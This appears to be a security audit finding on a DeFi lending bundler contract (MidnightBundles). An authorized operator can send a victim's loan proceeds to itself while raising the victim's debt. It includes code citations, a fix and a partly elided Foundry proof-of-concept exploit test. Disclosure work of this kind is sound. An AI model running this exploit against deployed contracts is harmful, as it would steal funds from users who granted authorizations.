Now I have a complete picture of the code. Let me trace the full execution path.

### Title
Unconstrained `receiver` in `supplyCollateralAndSellWithAssetsTarget` allows authorized operator to redirect victim's loan proceeds to themselves - (File: src/periphery/MidnightBundles.sol)

### Summary

`supplyCollateralAndSellWithAssetsTarget` checks that `msg.sender` is authorized by `taker` on Midnight, but places no constraint on the `receiver` parameter when `taker != msg.sender`. An attacker who holds a Midnight authorization from the victim can call the function with `taker=victim, receiver=attacker`, supply their own collateral to the victim's position, take buy offers that increase the victim's debt, and collect the resulting loan assets themselves.

### Finding Description

**Exact code path:**

**Bundler entry (line 262):**
```solidity
require(taker == msg.sender || IMidnight(MIDNIGHT).isAuthorized(taker, msg.sender), Unauthorized());
```
With `taker=victim` and `msg.sender=attacker`, and `isAuthorized(victim, attacker) == true`, this passes. [1](#0-0) 

**Collateral supply (lines 271–274):**
```solidity
pullToken(token, msg.sender, ...);   // pulls from attacker
IMidnight(MIDNIGHT).supplyCollateral(market, ..., taker); // credited to victim
```
Attacker's own collateral is pulled and deposited into the victim's position. [2](#0-1) 

**Take call (line 292–294):**
```solidity
try IMidnight(MIDNIGHT).take(
    takes[i].offer, takes[i].ratifierData, unitsToTake, taker, address(this), address(0), ""
)
```
The bundler calls `take` with `taker=victim` and `receiverIfTakerIsSeller=address(this)`. Midnight's own authorization check (`isAuthorized[victim][bundler]`) passes because the victim authorized the bundler. [3](#0-2) 

**Inside `Midnight.take` with `offer.buy=true`:**
- `seller = taker = victim` → `sellerPos.debt += sellerDebtIncrease` (victim's debt grows)
- `receiver = receiverIfTakerIsSeller = address(bundler)`
- `safeTransferFrom(loanToken, payer, bundler, sellerAssets)` — loan tokens land in the bundler [4](#0-3) [5](#0-4) 

**Health check (line 476):** The attacker pre-supplied enough collateral to keep the victim's position healthy, so `isHealthy` passes. [6](#0-5) 

**Final transfer (line 307):**
```solidity
SafeTransferLib.safeTransfer(loanToken, receiver, targetSellerAssets);
```
`receiver` is the attacker-supplied address — no check enforces `receiver == taker` when `taker != msg.sender`. [7](#0-6) 

**Root cause:** The bundler's authorization gate only verifies that `msg.sender` may act on behalf of `taker`. It does not restrict where the resulting loan assets are sent. The interface itself names the parameter `receiverIfTakerIsSeller`, signalling it is only meaningful when `taker == msg.sender`, but the implementation applies it unconditionally. [8](#0-7) 

The identical structural flaw exists in `supplyCollateralAndSellWithUnitsTarget` (line 168). [9](#0-8) 

### Impact Explanation

Victim's position accrues debt (via `sellerPos.debt += sellerDebtIncrease`) that the victim must repay at maturity or face liquidation. The corresponding loan assets are transferred to the attacker, not the victim. The attacker recovers their collateral cost in loan tokens; the victim is left holding the liability. This directly violates the invariant that debt increase on a position must only occur with the position owner's explicit consent for the specific receiver of the proceeds.

### Likelihood Explanation

**Preconditions:**
1. Victim has authorized the bundler on Midnight — standard for any user of the bundler.
2. Victim has authorized the attacker on Midnight — required; this is the binding constraint.

Condition 2 is non-trivial but realistic: users authorize smart-contract operators, portfolio managers, or aggregators. A compromised or malicious authorized operator can execute this attack immediately, repeatedly, and atomically. No oracle manipulation, admin access, or impossible state is required.

### Recommendation

When `taker != msg.sender`, enforce that `receiver == taker`:

```solidity
if (taker != msg.sender) require(receiver == taker, Unauthorized());
```

Apply the same fix to `supplyCollateralAndSellWithUnitsTarget`. This matches the semantic implied by the interface parameter name `receiverIfTakerIsSeller`: the free-choice receiver is only valid when the taker is the direct caller.

### Proof of Concept

```solidity
function testAttackerRedirectsVictimLoanProceeds() public {
    address victim  = makeAddr("victim");
    address attacker = makeAddr("attacker");

    // Victim authorizes bundler and attacker on Midnight (preconditions).
    vm.prank(victim);
    midnight.setIsAuthorized(address(midnightBundles), true, victim);
    vm.prank(victim);
    midnight.setIsAuthorized(attacker, true, victim);

    // Prepare a buy offer (lender side).
    uint256 units = 100e18;
    offers[0].maxUnits = units;
    // ... standard offer setup ...

    // Attacker supplies collateral to victim's position via bundler.
    uint256 collateralAmt = _collateralAmount(0, units);
    deal(market.collateralParams[0].token, attacker, collateralAmt);
    vm.prank(attacker);
    ERC20(market.collateralParams[0].token).approve(address(midnightBundles), collateralAmt);

    CollateralSupply[] memory supplies = new CollateralSupply[](1);
    supplies[0] = CollateralSupply({collateralIndex: 0, assets: collateralAmt, permit: _noPermit()});

    Take[] memory takes = new Take[](1);
    takes[0] = Take({offer: offers[0], units: units, ratifierData: hex""});

    uint256 targetSellerAssets = /* computed from price */ ...;

    uint256 attackerBalBefore = loanToken.balanceOf(attacker);
    uint256 victimDebtBefore  = midnight.debtOf(id, victim);

    vm.prank(attacker);
    midnightBundles.supplyCollateralAndSellWithAssetsTarget(
        targetSellerAssets,
        type(uint256).max,
        victim,    // taker = victim
        attacker,  // receiver = attacker  ← exploit
        supplies,
        takes,
        0,
        address(0)
    );

    // Assertions:
    assertGt(midnight.debtOf(id, victim), victimDebtBefore, "victim debt increased");
    assertEq(loanToken.balanceOf(attacker), attackerBalBefore + targetSellerAssets, "attacker received loan assets");
    assertEq(loanToken.balanceOf(victim), 0, "victim received nothing");
}
```

**Expected assertions:** victim's debt increases by `units`; attacker's loan token balance increases by `targetSellerAssets`; victim's loan token balance is unchanged.

### Citations

**File:** src/periphery/MidnightBundles.sol (L168-168)
```text
        SafeTransferLib.safeTransfer(loanToken, receiver, filledSellerAssets - referralFeeAssets);
```

**File:** src/periphery/MidnightBundles.sol (L262-262)
```text
        require(taker == msg.sender || IMidnight(MIDNIGHT).isAuthorized(taker, msg.sender), Unauthorized());
```

**File:** src/periphery/MidnightBundles.sol (L271-274)
```text
            pullToken(token, msg.sender, collateralSupplies[i].assets, collateralSupplies[i].permit);
            forceApproveMax(token, MIDNIGHT);
            IMidnight(MIDNIGHT)
                .supplyCollateral(market, collateralSupplies[i].collateralIndex, collateralSupplies[i].assets, taker);
```

**File:** src/periphery/MidnightBundles.sol (L292-300)
```text
            try IMidnight(MIDNIGHT)
                .take(
                    takes[i].offer, takes[i].ratifierData, unitsToTake, taker, address(this), address(0), ""
                ) returns (
                uint256, uint256 resSellerAssets
            ) {
                filledUnits += unitsToTake;
                filledSellerAssets += resSellerAssets;
            } catch {}
```

**File:** src/periphery/MidnightBundles.sol (L307-307)
```text
        SafeTransferLib.safeTransfer(loanToken, receiver, targetSellerAssets);
```

**File:** src/Midnight.sol (L375-414)
```text
        (address buyer, address seller) = offer.buy ? (offer.maker, taker) : (taker, offer.maker);
        Position storage buyerPos = position[id][buyer];
        Position storage sellerPos = position[id][seller];

        if (hasCredit(id, buyer) || units > buyerPos.debt) _updatePosition(offer.market, id, buyer);
        if (hasCredit(id, seller)) _updatePosition(offer.market, id, seller);

        uint256 buyerCreditIncrease = UtilsLib.zeroFloorSub(units, buyerPos.debt);
        uint256 sellerCreditDecrease = UtilsLib.min(units, sellerPos.credit);
        uint256 sellerDebtIncrease = units - sellerCreditDecrease;
        uint128 buyerPendingFeeIncrease =
            UtilsLib.toUint128(buyerCreditIncrease.mulDivDown(_marketState.continuousFee * timeToMaturity, WAD));
        uint128 sellerPendingFeeDecrease = sellerPos.credit > 0
            ? UtilsLib.toUint128(sellerPos.pendingFee.mulDivUp(sellerCreditDecrease, sellerPos.credit))
            : 0;

        require(block.timestamp <= offer.market.maturity || sellerDebtIncrease == 0, CannotIncreaseDebtPostMaturity());
        require(
            !offer.reduceOnly || (offer.buy ? buyerCreditIncrease == 0 : sellerDebtIncrease == 0),
            MakerCreditOrDebtIncreased()
        );

        require(
            offer.market.enterGate == address(0) || buyerCreditIncrease == 0
                || IEnterGate(offer.market.enterGate).canIncreaseCredit(buyer),
            BuyerGatedFromIncreasingCredit()
        );
        require(
            offer.market.enterGate == address(0) || sellerDebtIncrease == 0
                || IEnterGate(offer.market.enterGate).canIncreaseDebt(seller),
            SellerGatedFromIncreasingDebt()
        );

        buyerPos.debt -= UtilsLib.toUint128(units - buyerCreditIncrease);
        buyerPos.pendingFee += buyerPendingFeeIncrease;
        buyerPos.credit += UtilsLib.toUint128(buyerCreditIncrease);

        sellerPos.pendingFee -= sellerPendingFeeDecrease;
        sellerPos.credit -= UtilsLib.toUint128(sellerCreditDecrease);
        sellerPos.debt += UtilsLib.toUint128(sellerDebtIncrease);
```

**File:** src/Midnight.sol (L423-456)
```text
        address receiver = offer.buy ? receiverIfTakerIsSeller : offer.receiverIfMakerIsSeller;

        emit EventsLib.Take(
            msg.sender,
            id,
            units,
            taker,
            offer.maker,
            offer.buy,
            offer.group,
            buyerAssets,
            sellerAssets,
            newConsumed,
            buyerPendingFeeIncrease,
            sellerPendingFeeDecrease,
            buyerCreditIncrease,
            sellerCreditDecrease,
            receiver,
            payer
        );

        bool wasLocked = UtilsLib.tExchange(LIQUIDATION_LOCK_SLOT, id, seller, true);
        if (buyerCallback != address(0)) {
            bytes memory buyerCallbackData = offer.buy ? offer.callbackData : takerCallbackData;
            require(
                IBuyCallback(buyerCallback)
                    .onBuy(id, offer.market, buyerAssets, units, buyerPendingFeeIncrease, buyer, buyerCallbackData)
                == CALLBACK_SUCCESS,
                WrongBuyCallbackReturnValue()
            );
        }

        SafeTransferLib.safeTransferFrom(offer.market.loanToken, payer, address(this), buyerAssets - sellerAssets);
        SafeTransferLib.safeTransferFrom(offer.market.loanToken, payer, receiver, sellerAssets);
```

**File:** src/Midnight.sol (L476-476)
```text
        require(liquidationLocked(id, seller) || isHealthy(offer.market, id, seller), SellerIsLiquidatable());
```

**File:** src/periphery/interfaces/IMidnightBundles.sol (L56-56)
```text
    function supplyCollateralAndSellWithAssetsTarget(uint256 targetSellerAssets, uint256 maxUnits, address taker, address receiverIfTakerIsSeller, CollateralSupply[] memory collateralSupplies, Take[] memory takes, uint256 referralFeePct, address referralFeeRecipient) external;
```
